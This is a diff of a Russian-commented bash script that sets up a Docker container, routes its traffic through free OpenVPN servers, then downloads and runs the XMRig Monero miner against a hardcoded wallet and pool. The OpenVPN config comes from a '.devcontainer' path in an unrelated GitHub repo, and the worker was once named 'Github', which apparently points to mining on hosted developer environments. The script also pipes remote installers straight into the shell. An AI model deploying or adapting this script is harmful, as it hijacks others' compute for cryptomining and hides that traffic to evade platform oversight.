@@ -1,23 +1,28 @@
 #!/bin/bash
+set -e
 
-# === 1. Установка Docker и необходимых пакетов ===
-echo "[+] Обновление пакетов и установка Docker и Docker Compose..."
-sudo apt update && sudo apt install -y docker.io docker-compose openvpn curl unzip
+echo "[🔧] Подготовка среды..."
 
-# === 2. Проверка, установлен ли Docker ===
+# Установка Docker, если его нет
 if ! command -v docker &> /dev/null; then
-  echo "[-] Docker не установлен. Прерывание."
-  exit 1
+  echo "[⬇️] Установка Docker..."
+  curl -fsSL https://get.docker.com | sh
 fi
 
-# === 3. Создание рабочей директории ===
-echo "[+] Создание директории ~/dockercom..."
-mkdir -p ~/dockercom
-cd ~/dockercom || exit 1
+# Установка docker compose plugin, если нужно
+if ! docker compose version &> /dev/null; then
+  echo "[⬇️] Установка docker compose plugin..."
+  mkdir -p ~/.docker/cli-plugins
+  curl -SL https://github.com/docker/compose/releases/download/v2.27.0/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose
+  chmod +x ~/.docker/cli-plugins/docker-compose
+fi
 
-# === 4. Создание docker-compose файла ===
-echo "[+] Создание файла ubuntu_gui.yml..."
-cat > ubuntu_gui.yml <<EOF
+echo "[📁] Создание директории ~/dockercom и переход в неё..."
+mkdir -p ~/dockercom && cd ~/dockercom
+
+echo "[📝] Создание docker-compose.yml..."
+
+cat > docker-compose.yml <<EOF
 version: '3.8'
 
 services:
@@ -40,73 +45,47 @@ services:
     shm_size: "2g"
 EOF
 
-# === 5. Запуск контейнера ===
-echo "[+] Запуск контейнера..."
-sudo docker-compose -f ubuntu_gui.yml up -d
+echo "[🚀] Запуск контейнера..."
+docker compose up -d
 
-# === 6. Проверка запущенных контейнеров ===
-echo "[+] Проверка контейнеров:"
-sudo docker ps
+sleep 15
 
-# === 7. Подключение к VPN (Часть 1) ===
-echo "[+] Настройка OpenVPN внутри контейнера (часть 1)..."
+echo "[🧪] Проверка:"
+docker ps
+
 sudo docker exec -i ubuntu_gui bash <<'EOC'
-apt update
-apt install -y openvpn curl
-
-cd /tmp
-curl -L -o vpn.ovpn https://raw.githubusercontent.com/proton7771/jdhdghs/refs/heads/main/.devcontainer/vpnbook-de20-tcp443.ovpn
-
-cat > auth.txt <<EOP
-vpn-vpnjantit.com
-vpn
-EOP
-
+apt update && apt install -y openvpn curl
+cd /tmp && curl -L -o vpn.ovpn https://raw.githubusercontent.com/proton7771/jdhdghs/refs/heads/main/.devcontainer/vpnbook-de20-tcp443.ovpn
+cat > auth.txt <<EOF2
+user
+pass
+EOF2
 openvpn --config vpn.ovpn --auth-user-pass auth.txt --daemon
 EOC
-
-# === 8. Подключение к VPN (Часть 2) ===
-echo "[+] Расширенная настройка VPN внутри контейнера (часть 2)..."
+echo "[+] Настройка VPN (часть 2)..."
 sudo docker exec -i ubuntu_gui bash <<'EOC'
-apt update
-apt install -y openvpn curl unzip resolvconf
-
-cd /tmp
-curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
+apt update && apt install -y openvpn curl unzip resolvconf
+cd /tmp && curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
 unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook
-
-cat > vpnbook/auth.txt <<EOF
-vpn-vpnjantit.com
-vpn
-EOF
-
-if [ ! -c /dev/net/tun ]; then
-  echo "❌ TUN device not available. VPN не сможет работать."
-  exit 1
-fi
-
+cat > vpnbook/auth.txt <<EOF2
+user
+pass
+EOF2
+[ ! -c /dev/net/tun ] && echo "❌ TUN device not available." && exit 1
 echo "nameserver 1.1.1.1" > /etc/resolv.conf
-
 openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
-    --auth-user-pass vpnbook/auth.txt \
-    --daemon \
-    --route-up '/etc/openvpn/update-resolv-conf' \
-    --down '/etc/openvpn/update-resolv-conf'
-
-echo "⏳ Ждём 45 секунд, чтобы VPN поднялся..."
-sleep 45
-
-echo "🌐 Текущий внешний IP:"
-curl -s ifconfig.me
+  --auth-user-pass vpnbook/auth.txt --daemon \
+  --route-up '/etc/openvpn/update-resolv-conf' --down '/etc/openvpn/update-resolv-conf'
+sleep 45 && echo "🌐 IP:" && curl -s ifconfig.me
 EOC
 
 # === 9. Установка и запуск XMRig ===
 echo "[+] Установка и запуск XMRig внутри контейнера..."
 sudo docker exec -i ubuntu_gui bash <<'EOM'
 # Пользовательские настройки
-POOL="pool.supportxmr.com:3333"
+POOL="gulf.moneroocean.stream:10128"
 WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
-PASSWORD="Github"
+PASSWORD="worker_name"
 
 # Загрузка XMRig
 XMRIG_VERSION="6.22.2"
@@ -160,7 +139,6 @@ chmod +x xmrig
 echo "[*] Запуск майнинга..."
 ./xmrig -c config.json
 EOM
-
 # === 10. Финальное сообщение ===
 echo
 echo "[✅] Всё запущено."
